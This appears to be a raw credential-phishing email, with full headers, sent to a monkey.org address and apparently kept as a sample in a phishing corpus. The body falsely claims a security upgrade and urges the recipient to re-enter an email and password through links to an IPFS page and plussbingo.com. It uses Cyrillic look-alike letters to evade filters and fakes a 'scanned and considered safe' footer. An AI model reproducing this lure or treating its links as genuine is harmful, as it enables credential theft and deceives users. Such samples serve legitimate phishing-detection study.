@@ -1,0 +1,151 @@
+Return-Path: gwen@asmdy.com
+Delivered-To: jose@monkey.org
+X-FDA: 82094873742.28.751241B
+Received: from mail.apsfl.co.in (mail.apsfl.co.in [103.211.109.135])
+	by imf20.b.hostedemail.com (Postfix) with SMTP id B7E6C6000C
+	for <jose@monkey.org>; Wed,  8 May 2024 10:35:58 +0000 (UTC)
+Authentication-Results: imf20.b.hostedemail.com;	dkim=pass
+ header.d=apsfl.co.in header.s=C18A96D4-A33F-11E6-8499-F8218B9BD2FA
+ header.b=E4zyLJTY;	spf=softfail (imf20.b.hostedemail.com: 103.211.109.135 is
+ neither permitted nor denied by domain of gwen@asmdy.com)
+ smtp.mailfrom=gwen@asmdy.com;	dmarc=none
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1715164569;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	
+ references:dkim-signature; bh=k3JJTRphux6cTM+PZAetoK6vs3fQkjOVnkArDk7Wgxg=;
+	b=y3kqYjSABGmCCQNEUsuRGInUbqj1lbFVwX7xC+77Pz9qIcxVybHIjT8B5/gOet0kpB9phV
+	amu/24Kq2rl8T1Zs68soL/prpGTqg0N+864NQCkN8rCWEixwjhHy9GQ81syxNql2VBjL/A
+	2byvZaEVsw3/NS9mrd434tYL6zVrj80=
+ARC-Authentication-Results: i=1;	imf20.b.hostedemail.com;	dkim=pass
+ header.d=apsfl.co.in header.s=C18A96D4-A33F-11E6-8499-F8218B9BD2FA
+ header.b=E4zyLJTY;	spf=softfail (imf20.b.hostedemail.com: 103.211.109.135 is
+ neither permitted nor denied by domain of gwen@asmdy.com)
+ smtp.mailfrom=gwen@asmdy.com;	dmarc=none
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1715164569; a=rsa-sha256;
+	cv=none;
+	b=k0ZUk0b0viHBWl4TseehEfIgbqs2Hu5hhtqVwA2gh1TQjptS7173rdCoNCbH+MzBrWMLz0
+	Bxfq7YlThjZWfp0YmPjflHcEixH+OS8bzGuqGa0xNM9ksfuEzjI19WVwtm6dpZHAAZ+rX7
+	FdwUezKfpR3lFdqhKOiV+ZGe4xKeyC0=
+Received: from localhost (localhost [127.0.0.1])
+	by mail.apsfl.co.in (Postfix) with ESMTP id 85B74114BA04F
+	for <jose@monkey.org>; Wed,  8 May 2024 15:25:16 +0530 (IST)
+Received: from mail.apsfl.co.in ([127.0.0.1])
+	by localhost (mail.apsfl.co.in [127.0.0.1]) (amavisd-new, port 10032)
+	with ESMTP id wcv_nmLXCmqD for <jose@monkey.org>;
+	Wed,  8 May 2024 15:25:12 +0530 (IST)
+Received: from localhost (localhost [127.0.0.1])
+	by mail.apsfl.co.in (Postfix) with ESMTP id ADF3312721F4B
+	for <jose@monkey.org>; Wed,  8 May 2024 10:20:31 +0530 (IST)
+DKIM-Filter: OpenDKIM Filter v2.9.2 mail.apsfl.co.in ADF3312721F4B
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=apsfl.co.in;
+	s=C18A96D4-A33F-11E6-8499-F8218B9BD2FA; t=1715143831;
+	bh=k3JJTRphux6cTM+PZAetoK6vs3fQkjOVnkArDk7Wgxg=;
+	h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:
+	 Content-Transfer-Encoding;
+	b=E4zyLJTYE/RVFFPmKgohsbtcQI+1llOtmrm0N45Zv0G5iUqX1EQOTNL4zSFBVJNo3
+	 lXGIKRX+K3p2WLoawnqUPNGEXjkBdc9ACqTslCXunKgi+XmU2KbQ7zYyu84v811wNR
+	 33jLwY14jawcbrP3x7XA8t29JcM6Jte64oUMaQnw=
+X-Virus-Scanned: amavisd-new at apsfl.co.in
+Received: from mail.apsfl.co.in ([127.0.0.1])
+	by localhost (mail.apsfl.co.in [127.0.0.1]) (amavisd-new, port 10026)
+	with ESMTP id g9u8ekRTJzTg for <jose@monkey.org>;
+	Wed,  8 May 2024 10:20:31 +0530 (IST)
+Received: from [45.84.89.218] (unknown [45.84.89.218])
+	by mail.apsfl.co.in (Postfix) with ESMTPSA id BA11A126C4DA6
+	for <jose@monkey.org>; Wed,  8 May 2024 00:08:31 +0530 (IST)
+From: ServerReport <chakradharm@apsfl.co.in>
+To: jose@monkey.org
+Subject: Security Upgrade
+Date: 7 May 2024 11:38:31 -0700
+Message-ID: <20240507113830.9AC9ACD203C10E9B@apsfl.co.in>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Stat-Signature: nbp1kpe614j9abh5967c7akrjqmt3j5k
+X-Rspamd-Queue-Id: B7E6C6000C
+X-Rspam-User: 
+X-Rspamd-Server: rspam10
+X-Spam-Status: Yes, score=15.10
+X-HE-Tag: 1715164558-386613
+X-HE-Meta: =?utf-8?q?U2FsdGVkX19dxeeGqGKob+e6jyg8PA6VVL0pOpaxIYP/DEV6Sgu7Y9N?=
+ =?utf-8?q?aW98BU6iihk4sKWhPAwvqault4EgzdyJ6n9IEXdIVgWHHrgnbYgjya0LTCF5hb60p?=
+ =?utf-8?q?Mj74cdzLyQc3DhDEyIaQ7OlzbvUU65YF0xmR/MesDuOFjV39bezmt0tedeXsdXs47?=
+ =?utf-8?q?zxbNoORWl4kL0yNR01c4lcStHgyTrcvnKNKRPU58cSyQhQ1oFA=3D?=
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 129
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+
+<html><head>
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"margin: 0.5em;"><div><div class=3D"v1v1v1js-helper_mr_css_at=
+tr v1v1v1js-readmsg-msg_mr_css_attr"><div><div id=3D"v1v1v1style_1660067352=
+1725123544_BODY_mr_css_attr"><div class=3D"v1v1v1cl_300945_mr_css_attr">
+<p style=3D'text-align: left; color: rgb(29, 34, 40); text-transform: none;=
+ text-indent: 0px; letter-spacing: normal; font-family: "Helvetica Neue",He=
+lvetica,Arial,sans-serif; font-size: 13px; font-style: normal; font-weight:=
+ 400; word-spacing: 0px; white-space: normal; orphans: 2; widows: 2; backgr=
+ound-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-varian=
+t-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: =
+initial; text-decoration-style: initial;=20
+text-decoration-color: initial;'><span style=3D"font-family: Segoe UI Light=
+;">Hi jose,<br><br>We conducted a security&nbsp;upgrade on your account,<br=
+><br>
+Kindly reinput your email and password for protection.<br><br>
+<a class=3D"v1v1v1yiv9588887225lsuo8_mr_css_attr" style=3D'background: rgb(=
+38, 112, 236); padding: 7px; color: rgb(255, 255, 255); font-family: "segoe=
+ ui light"; font-size: 15px; text-decoration: none;' href=3D"https://bafybe=
+iaazqds7ilfgeula3lngcfhgi22fhom5n7oofzqvmvoc3javzqgna.ipfs.cf-ipfs.com/#jos=
+e@monkey.org" target=3D"_blank" rel=3D"noreferrer"> Update &#1056;&#1072;ss=
+word</a> <a href=3D"https://plussbingo.com/tNWvlC--oWZyQ--NmnHCTxue/IFUE--h=
+uSlF--diUcufWiBrZ/index.html#jose@monkey.org"><br><br>
+N&#1086;t&#1077;:<span>
+&nbsp;</span><span style=3D"color: rgb(255, 0, 0);"> Do not ignore this pro=
+cess!!</span><br><br>Th&#1072;nk you,<br>2023 monkey.org Support</a></span>=
+</p>
+<p style=3D'text-align: left; color: rgb(29, 34, 40); text-transform: none;=
+ line-height: 20px; text-indent: 0px; letter-spacing: normal; font-family: =
+"Helvetica Neue",Helvetica,Arial,sans-serif; font-size: 12px; font-style: n=
+ormal; font-weight: 400; word-spacing: 0px; white-space: normal; orphans: 2=
+; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: =
+normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-dec=
+oration-thickness: initial; text-decoration-style:=20
+initial; text-decoration-color: initial;'><a class=3D"v1v1v1yiv9588887225Un=
+subscribe--unsubscribeLink_mr_css_attr" style=3D"color: rgb(25, 106, 212); =
+font-family: sans-serif; text-decoration: none;" href=3D"https://sgp1.digit=
+aloceanspaces.com/5mian6stgcdpi762tei0q51/%26%26%21%24%24%21.%26%21%24O/%26=
+%26%21%24%24.5.M.0%24%21%24%21%24%26.html#csv@channelfrt.com" target=3D"_bl=
+ank" rel=3D"noreferrer">Unsubscribe<span>&nbsp;</span></a>-<span>&nbsp;</sp=
+an>
+ <a class=3D"v1v1v1yiv9588887225Unsubscribe--unsubscribePreferences_mr_css_=
+attr" style=3D"color: rgb(25, 106, 212); font-family: sans-serif; text-deco=
+ration: none;" href=3D"https://sgp1.digitaloceanspaces.com/5mian6stgcdpi762=
+tei0q51/%26%26%21%24%24%21.%26%21%24O/%26%26%21%24%24.5.M.0%24%21%24%21%24%=
+26.html#csv@channelfrt.com" target=3D"_blank" rel=3D"noreferrer">Unsubscrib=
+e Preferences</a>
+<br style=3D'text-align: left; color: rgb(51, 51, 51); text-transform: none=
+; text-indent: 0px; letter-spacing: normal; font-family: "Lucida Grande", V=
+erdana, Arial, Helvetica, sans-serif; font-size: 11px; font-style: normal; =
+font-weight: 400; word-spacing: 0px; white-space: normal; box-sizing: borde=
+r-box; orphans: 2; widows: 2; font-variant-ligatures: normal; font-variant-=
+caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: in=
+itial; text-decoration-style: initial;=20
+text-decoration-color: initial;'>
+<span style=3D'text-align: left; color: rgb(134, 135, 120); text-transform:=
+ none; text-indent: 0px; letter-spacing: normal; font-family: "Lucida Grand=
+e", Verdana, Arial, Helvetica, sans-serif; font-size: 11px; font-style: nor=
+mal; font-weight: 400; word-spacing: 0px; white-space: normal; box-sizing: =
+border-box; orphans: 2; widows: 2; font-variant-ligatures: normal; font-var=
+iant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thicknes=
+s: initial; text-decoration-style: initial;=20
+text-decoration-color: initial;'>This mail has been scanned and considered =
+safe.</span></p></div></div></div></div></div></body></html>
+
